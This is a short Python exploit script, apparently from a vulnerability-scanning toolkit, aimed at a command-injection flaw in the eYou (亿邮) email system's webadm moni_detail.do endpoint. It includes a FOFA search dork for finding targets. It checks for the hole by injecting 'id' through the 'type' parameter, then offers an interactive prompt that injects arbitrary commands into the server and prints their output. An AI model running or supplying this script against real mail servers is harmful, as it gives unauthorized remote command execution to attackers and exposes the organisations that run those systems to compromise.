#!/usr/bin/python3
# Author 9527
# fofa dork: app="亿邮电子邮件系统"

import requests
import os
import sys
import re
from urllib3.exceptions import InsecureRequestWarning
from scripts import printColor

def check(ip):
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    target = ip
    payload = target + '/webadm/?q=moni_detail.do&action=gragh'

    data = "type='|id||'"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
    }

    response = requests.post(payload, data=data, headers=headers, verify=False, timeout=5)

    if (response.status_code == 200 and 'gid=' in response.text):
        pc = printColor.Colors()
        pc.print_red_text("[+]Target is vuln!")
        while True:
            command = input('#: ')
            data = "type='|" + command + "||'"
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
            }
            response = requests.post(payload, data=data, headers=headers, verify=False, timeout=5)
            # print(response.text)
            result = re.match(r'<html>(.|\n)*</html>', response.text)
            CmdShow = response.text.replace(result[0], "")
            print(CmdShow)
            return 1

    else:
        print("亿邮电子邮件命令执行漏洞 is not vuln!")